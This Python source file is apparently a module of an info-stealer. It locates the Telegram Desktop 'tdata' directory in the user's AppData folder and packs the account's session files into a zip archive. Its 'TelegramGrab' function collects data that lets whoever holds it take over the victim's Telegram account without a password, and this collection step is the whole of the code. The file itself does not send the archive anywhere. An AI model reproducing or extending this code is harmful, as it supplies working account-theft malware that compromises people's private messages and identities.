# Import modules

import os
from zipfile import ZIP_DEFLATED, ZipFile


Files = [
	'D877F783D5D3EF8Cs',
	'D877F783D5D3EF8C\\maps'
	]


# Get telegram tdata directory

def Scan():
 tdata = os.path.join(os.getenv('AppData'), 'Telegram Desktop\\tdata')
 return tdata


# Grab telegram session files

def TelegramGrab(Directory, TelegramDir=Scan()):
 if not os.path.exists(TelegramDir):
  return None

 with ZipFile(Directory + 'tdata.zip', 'w', ZIP_DEFLATED) as Archive:
  os.chdir(TelegramDir)

  for File in Files:
   if os.path.exists(File):
    Archive.write(File, os.path.join('tdata', File))